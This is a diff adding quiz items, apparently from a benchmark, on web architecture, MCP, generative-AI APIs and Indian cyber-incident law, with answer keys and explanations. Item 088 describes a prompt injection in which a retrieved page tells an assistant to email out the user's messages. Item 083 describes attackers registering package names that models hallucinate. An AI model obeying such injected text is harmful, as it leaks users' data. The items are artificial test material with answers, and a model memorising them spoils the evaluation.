+  "exp": "Kafka guarantees ordering only within a single partition, and the default partitioner hashes the message key, so keying by account identifier pins one account's whole event stream to one partition read by one consumer in the group. Adding partitions is the opposite of a fix — it spreads an unkeyed account's events across more partitions and destroys any ordering, and no partition count makes the routing deterministic without a key.",
+  "conf": "high"
+ },
+ {
+  "id": "GEN-T2U2-076",
+  "sub": "Architecture and scale: MVC, microservices, SOLID, event-driven systems, caching and queues",
+  "q": "A worker consuming an Amazon SQS standard queue throws an unhandled exception on one malformed message. The message's visibility timeout expires, it returns to the queue, the worker picks it up and crashes again, and this repeats indefinitely while healthy messages pile up behind it. Which queue configuration is the standard remedy for this poison-message loop?",
+  "opts": {
+   "A": "Lengthening the visibility timeout so the message stays invisible longer between attempts",
+   "B": "Converting the queue to FIFO so the message is delivered exactly once",
+   "C": "A redrive policy that moves the message to a dead-letter queue once its receive count exceeds `maxReceiveCount`",
+   "D": "Adding more worker instances so the malformed message occupies a smaller share of consumer capacity"
+  },
+  "ans": "C",
+  "exp": "A redrive policy counts deliveries per message and diverts anything exceeding `maxReceiveCount` to a dead-letter queue, quarantining the bad message for offline inspection while the main queue drains. FIFO queues are the most plausible distractor because they do offer exactly-once processing within the deduplication window, but that governs duplicate sends, not repeated redelivery after a consumer failure — a FIFO queue would in fact make things worse by blocking the whole message group behind the poison message.",
+  "conf": "high"
+ },
+ {
+  "id": "GEN-T2U2-077",
+  "sub": "Architecture and scale: MVC, microservices, SOLID, event-driven systems, caching and queues",
+  "q": "A write-heavy service places a cache in front of its database. The design requires the lowest achievable write latency and explicitly accepts that a crash of a cache node may lose the most recent writes that have not yet been flushed to the database. Which cache write strategy is being described?",
+  "opts": {
+   "A": "Write-behind (write-back), where the write is acknowledged from the cache and persisted to the database asynchronously in batches",
+   "B": "Write-through, where every write goes to the cache and the database as one synchronous operation",
+   "C": "Cache-aside, where the application writes to the database and invalidates the cached entry",
+   "D": "Refresh-ahead, where the cache proactively reloads entries that are about to expire"
+  },
+  "ans": "A",
+  "exp": "Write-behind acknowledges the client as soon as the cache accepts the write and drains to the database later, which is what buys the low latency and what creates the durability window the requirement concedes. Write-through is the natural competitor and shares the same access shape, but because it commits to the database before acknowledging it has strictly higher write latency and loses nothing on a cache failure.",
+  "conf": "high"
+ },
+ {
+  "id": "GEN-T2U2-078",
+  "sub": "Architecture and scale: MVC, microservices, SOLID, event-driven systems, caching and queues",
+  "q": "A frontend codebase is described as MVVM rather than MVC. Which statement identifies the defining structural difference?",
+  "opts": {
+   "A": "MVVM eliminates the model layer, so the view obtains data by calling the backend API directly",
+   "B": "In MVVM the view model produces the rendered markup while the view holds the application state",
+   "C": "MVVM applies only to server-rendered pages, whereas MVC applies only to client-side applications",
+   "D": "In MVVM the view binds declaratively to observable state exposed by a view model that holds no reference to the view, so state changes propagate through the binding rather than through a controller that handles each interaction"
+  },
+  "ans": "D",
+  "exp": "MVVM's distinguishing mechanism is data binding: the view model publishes observable state and commands and is deliberately ignorant of any view, which is what makes it unit-testable without a rendering surface. The claim that MVVM drops the model is the most seductive wrong answer because view models are often mistaken for models, but MVVM keeps a domain/model layer and adds the view model as a presentation-shaped adapter over it.",
+  "conf": "high"
+ },
+ {
+  "id": "GEN-T2U2-079",
+  "sub": "Architecture and scale: MVC, microservices, SOLID, event-driven systems, caching and queues",
+  "q": "A Node.js project's `package.json` declares a dependency as `\"lodash\": \"^4.17.20\"` and the lockfile has been deleted. Under npm's semantic-versioning range rules, which of these published versions may `npm install` resolve the dependency to?",
+  "opts": {
+   "A": "3.10.1",
+   "B": "4.19.3",
+   "C": "5.0.1",
+   "D": "4.17.19"
+  },
+  "ans": "B",
+  "exp": "The caret range `^4.17.20` admits any version at or above 4.17.20 but below the next major, i.e. `>=4.17.20 <5.0.0`, so 4.19.3 is in range and npm will take the highest published match. 4.17.19 is the trap: it looks close enough to satisfy the caret, but it is lower than the stated minimum, and 5.0.1 crosses the major boundary the caret exists to hold.",
+  "conf": "high"
+ },
+ {
+  "id": "GEN-T2U2-080",
+  "sub": "AI-assisted web development, generative AI APIs, Model Context Protocol, analytics, ethics and law",
+  "q": "An Nginx reverse proxy fronts a Node backend that streams a generative AI completion to the browser as Server-Sent Events. Run locally the tokens appear one by one; through Nginx the client receives nothing until the model has finished, and then the whole response arrives at once. The location block is:\n\nlocation /api/chat/ {\n    proxy_pass http://127.0.0.1:8080;\n    proxy_http_version 1.1;\n    proxy_set_header Connection \"\";\n}\n\nWhich addition fixes the delivery?",
+  "opts": {
+   "A": "proxy_read_timeout 3600s;",
+   "B": "proxy_set_header Upgrade $http_upgrade;",
+   "C": "proxy_buffering off;",
+   "D": "proxy_cache_bypass $http_pragma;"
+  },
+  "ans": "C",
+  "exp": "Nginx buffers the upstream response by default, so an SSE stream is withheld until a buffer fills or the upstream closes the connection; turning buffering off for that location (or having the upstream send X-Accel-Buffering: no) passes each chunk straight through. The Upgrade header pair matters for the WebSocket handshake, not for SSE, which is an ordinary long-lived HTTP response.",
+  "conf": "high"
+ },
+ {
+  "id": "GEN-T2U2-081",
+  "sub": "AI-assisted web development, generative AI APIs, Model Context Protocol, analytics, ethics and law",
+  "q": "An MCP server for a deployment platform has to expose two capabilities: the text of a service's log file, which the host application should be able to fetch and place into the model's context on demand, and an operation that restarts that service. Which MCP primitives fit these two respectively?",
+  "opts": {
+   "A": "Both as tools, since either way the host has to make a call to the server",
+   "B": "The log file as a resource and the restart as a tool",
+   "C": "The log file as a prompt and the restart as a resource",
+   "D": "Both as resources, with the restart modelled as a writable resource"
+  },
+  "ans": "B",
+  "exp": "MCP resources are addressable, readable context that a client retrieves and hands to the model, whereas tools are invocable functions with side effects that the model can choose to call — a log file is context, a restart is an action. Option A is tempting because both involve a round trip to the server, but it discards precisely the distinction MCP draws so that a host can apply different trust and approval rules to reading data versus performing actions; prompts, the third primitive, are reusable templated interactions, not file contents.",
+  "conf": "high"
+ },
+ {
+  "id": "GEN-T2U2-082",
+  "sub": "AI-assisted web development, generative AI APIs, Model Context Protocol, analytics, ethics and law",
+  "q": "Messages exchanged between a host application's MCP client and an MCP server are encoded using which pre-existing specification?",
+  "opts": {
+   "A": "JSON-RPC 2.0",
+   "B": "gRPC with Protocol Buffers",
+   "C": "GraphQL queries over HTTP POST",
+   "D": "SOAP 1.2 envelopes over HTTP"
+  },
+  "ans": "A",
+  "exp": "MCP defines its requests, responses and notifications as JSON-RPC 2.0 messages, which is what lets the identical message shapes travel over a local stdio pipe or an HTTP-based transport without change. gRPC is the natural guess because it is the usual choice for machine-to-machine RPC, but it requires a binary codec and HTTP/2 and so would not suit the plain stdio local-subprocess server that MCP is built to support.",
+  "conf": "high"
+ },
+ {
+  "id": "GEN-T2U2-083",
+  "sub": "AI-assisted web development, generative AI APIs, Model Context Protocol, analytics, ethics and law",
+  "q": "Reviewing code produced by an AI coding assistant, a developer finds an import of an npm package whose name resembles, but is not, a well-known library. npm install succeeds and CI is green. Why is this a supply-chain concern rather than merely a typo?",
+  "opts": {
+   "A": "The invented name will break semantic-version resolution the next time the lockfile is refreshed",
+   "B": "npm silently substitutes the nearest published package name, so runtime behaviour differs from the source",
+   "C": "No type declarations will be found, so TypeScript degrades the import to any and hides errors",
+   "D": "Models invent the same plausible package names repeatedly, and attackers pre-register those names, so a successful install pulls attacker-controlled code"
+  },
+  "ans": "D",
+  "exp": "Hallucinated dependency names cluster rather than being random, so an attacker who publishes them obtains code execution in every build and developer machine that installs one — which is why the install succeeding is the alarming outcome, not a failing one. npm performs no nearest-name substitution: an unpublished name simply 404s, so the fact that it resolved at all is the evidence that somebody registered it.",
+  "conf": "high"
+ },
+ {
+  "id": "GEN-T2U2-084",
+  "sub": "AI-assisted web development, generative AI APIs, Model Context Protocol, analytics, ethics and law",
+  "q": "A support chat widget calls a stateless hosted generative AI chat-completion API, so the backend resends the whole transcript on every turn. Ignoring prompt caching, and assuming the transcript still fits inside the context window, how do the cumulative billed input tokens for one session grow with the number of turns n?",
+  "opts": {
+   "A": "Roughly linearly in n, because exactly one request is issued per turn",
+   "B": "Roughly with n squared, because each turn resends everything that preceded it",
+   "C": "Constant after the first turn, because the provider deduplicates context it has already seen in the session",
+   "D": "Bounded by the model's context window, so the session's cost stops rising once that size is reached"
+  },
+  "ans": "B",
+  "exp": "Turn k carries about k turns' worth of transcript, and summing k from 1 to n produces an n-squared term, so a long conversation costs far more than n times the opening request. Option D confuses a per-request limit with a per-session total: the context window caps how much any single call may carry, but every later call still bills that retained context again.",
+  "conf": "high"
+ },
+ {
+  "id": "GEN-T2U2-085",
+  "sub": "AI-assisted web development, generative AI APIs, Model Context Protocol, analytics, ethics and law",
+  "q": "A first-party web analytics script must post a small end-of-session payload as the user navigates away, but requests started from a visibilitychange or unload handler are frequently cancelled when the document is torn down. Which browser API was introduced specifically to hand such a request to the user agent for delivery after the page is gone?",
+  "opts": {
+   "A": "navigator.sendBeacon()",
+   "B": "window.requestIdleCallback()",
+   "C": "A synchronous XMLHttpRequest issued inside the unload handler",
+   "D": "A beforeunload listener that returns a string"
+  },
+  "ans": "A",
+  "exp": "sendBeacon() queues a small POST with the user agent, which undertakes to send it even after the document unloads, and it returns immediately so navigation is never delayed. Synchronous XHR in unload was the old workaround that sendBeacon exists to replace — browsers now block or ignore it precisely because it stalls the next navigation.",
+  "conf": "high"
+ },
+ {
+  "id": "GEN-T2U2-086",
+  "sub": "AI-assisted web development, generative AI APIs, Model Context Protocol, analytics, ethics and law",
+  "q": "A Kubernetes Deployment proxies user requests to an external generative AI provider; each request occupies a pod for 20-40 seconds while awaiting the upstream. Under load, queueing latency climbs steeply, but the HorizontalPodAutoscaler targeting 70% CPU utilisation reports the pods at about 5% CPU and never scales out. What explains this, and what is the correct fix?",
+  "opts": {
+   "A": "The CPU target is set too high; lowering it to 30% will make the same signal trigger scale-out",
+   "B": "The pods declare no CPU requests, so the HPA cannot compute utilisation; adding requests restores scaling",
+   "C": "The pods are blocked on I/O so CPU stays low; autoscale instead on a metric reflecting concurrency, such as in-flight requests or queue depth",
+   "D": "The readiness probe marks pods unready during long requests, so the HPA excludes them when averaging the metric"
+  },
+  "ans": "C",
+  "exp": "The workload is I/O-bound on the upstream API, so CPU is a poor proxy for saturation — the resource actually exhausted is concurrent in-flight requests per pod, which is what the autoscaler must observe via a custom or external metric. Lowering the target, as option A proposes, changes nothing when measured utilisation is 5%: the threshold is not the problem, the choice of signal is; and the reported 5% figure shows utilisation is being computed, so option B's missing-requests scenario is not what is happening.",
+  "conf": "high"
+ },
+ {
+  "id": "GEN-T2U2-087",
+  "sub": "AI-assisted web development, generative AI APIs, Model Context Protocol, analytics, ethics and law",
+  "q": "A state government department discovers that its public web portal has been defaced and a table of registered users exfiltrated. Under the CERT-In directions issued in April 2022, within what period of noticing such an incident must it be reported to CERT-In?",
+  "opts": {
+   "A": "72 hours",
+   "B": "24 hours",
+   "C": "30 days",
+   "D": "6 hours"
+  },
+  "ans": "D",
+  "exp": "The 2022 directions require the specified categories of cyber incident to be reported to CERT-In within six hours of noticing them or being brought to notice, a far tighter window than practitioners expect. Option A is the trap because 72 hours is the GDPR breach-notification deadline, which is frequently and wrongly assumed to apply in India; the same CERT-In directions also require ICT system logs to be maintained for 180 days within Indian jurisdiction.",
+  "conf": "high"
+ },
+ {
+  "id": "GEN-T2U2-088",
+  "sub": "AI-assisted web development, generative AI APIs, Model Context Protocol, analytics, ethics and law",
+  "q": "A web assistant fetches third-party pages and summarises them, and is also connected to an MCP server that can send email on the user's behalf. One retrieved page contains text instructing the assistant to forward the user's recent messages to an outside address. Which mitigation actually addresses this class of attack?",
+  "opts": {
+   "A": "Adding a line to the system prompt telling the model to disregard any instructions found inside retrieved content",
+   "B": "Enforcing authorisation and explicit user confirmation at the tool layer, so a send action cannot occur on the model's decision alone",
+   "C": "HTML-escaping the retrieved page before inserting its text into the prompt",
+   "D": "Lowering the sampling temperature so the model's output becomes more deterministic"
+  },
+  "ans": "B",
+  "exp": "Untrusted retrieved text and trusted instructions reach the model as one undifferentiated token stream, so no wording inside the prompt reliably separates them; the durable control sits outside the model, in least-privilege tool scopes and a confirmation step before any side-effecting call. Option A is the usual first attempt and is defeated by rephrased injections, because it asks the model to police the very boundary it cannot perceive; escaping HTML does nothing, since the payload is ordinary prose, not markup.",
+  "conf": "high"
+ }
+]
